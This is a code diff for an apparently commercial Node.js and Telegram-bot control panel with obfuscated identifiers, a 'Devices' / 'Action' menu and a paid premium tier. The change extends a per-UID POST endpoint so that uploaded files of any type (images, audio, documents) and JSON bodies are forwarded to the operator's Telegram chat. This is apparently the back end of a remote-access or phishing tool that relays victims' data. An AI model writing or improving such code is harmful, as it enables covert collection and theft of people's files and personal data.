@@ -11,7 +11,7 @@ const path = require('path');
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
-const uploader = multer();
+const uploader = multer(); // Handles all file types in memory
 
 let data = {};
 try {
@@ -133,17 +133,37 @@ app.get("/uid=:uid", async (req, res) => {
   res.json({ uid: user.uid, generated_url: user.generated_url });
 });
 
-// This is where data should be specifically routed per user UID.
-app.post("/uid=:uid", async (req, res) => {
+// 🔴 UPDATED ROUTE: Ab ye route Files (Multipart) aur JSON dono handle karega
+app.post("/uid=:uid", uploader.any(), async (req, res) => {
   const { uid } = req.params;
+  
+  // Verify User
   const { data: user } = await supabase.from("rm-d").select("uid").eq("uid", uid).single();
   if (!user) return res.status(404).json({ error: "Not found or Unauthorized" });
   
+  // Find Logged In Telegram ID
   const tgId = loggedInUsers.get(String(uid));
   if (tgId) {
-    bot.sendMessage(tgId, `<b>📊 𝙳𝚊𝚝𝚊 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚘𝚛 𝚢𝚘𝚞𝚛 𝚍𝚊𝚜𝚑𝚋𝚘𝚊𝚛𝚍</b>\n\n<b>${JSON.stringify(req.body)}</b>`, { 'parse_mode': "HTML" });
+    // 1. Agar request mein koi FILE bheji gayi hai (Images, Videos, CSV, Audio, txt etc.)
+    if (req.files && req.files.length > 0) {
+      for (const file of req.files) {
+        await bot.sendDocument(tgId, file.buffer, {
+          caption: `<b>📁 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚘𝚛 𝚢𝚘𝚞𝚛 𝚍𝚊𝚜𝚑𝚋𝚘𝚊𝚛𝚍</b>\n\n<b>Name:</b> ${file.originalname}`,
+          parse_mode: "HTML"
+        }, {
+          filename: file.originalname,
+          contentType: file.mimetype || "*/*"
+        }).catch(err => console.error("Error sending file to Telegram:", err.message));
+      }
+    }
+
+    // 2. Agar koi JSON Data bheja gaya hai (Sath mein ya akela)
+    if (req.body && Object.keys(req.body).length > 0) {
+      bot.sendMessage(tgId, `<b>📊 𝙳𝚊𝚝𝚊 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚘𝚛 𝚢𝚘𝚞𝚛 𝚍𝚊𝚜𝚑𝚋𝚘𝚊𝚛𝚍</b>\n\n<b>${JSON.stringify(req.body, null, 2)}</b>`, { 'parse_mode': "HTML" });
+    }
   }
-  res.json({ success: true });
+  
+  res.json({ success: true, message: "Data received successfully" });
 });
 
 io.on("connection", _0x48afef => {
@@ -848,7 +868,7 @@ bot.on("message", _0xdbde0c => {
                                 bot.sendMessage(chatId, "<b>💎 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 — contact <b>Romeo Uchiha</b> to buy</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
+                                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                                     'resize_keyboard': true
                                   }
                                 });
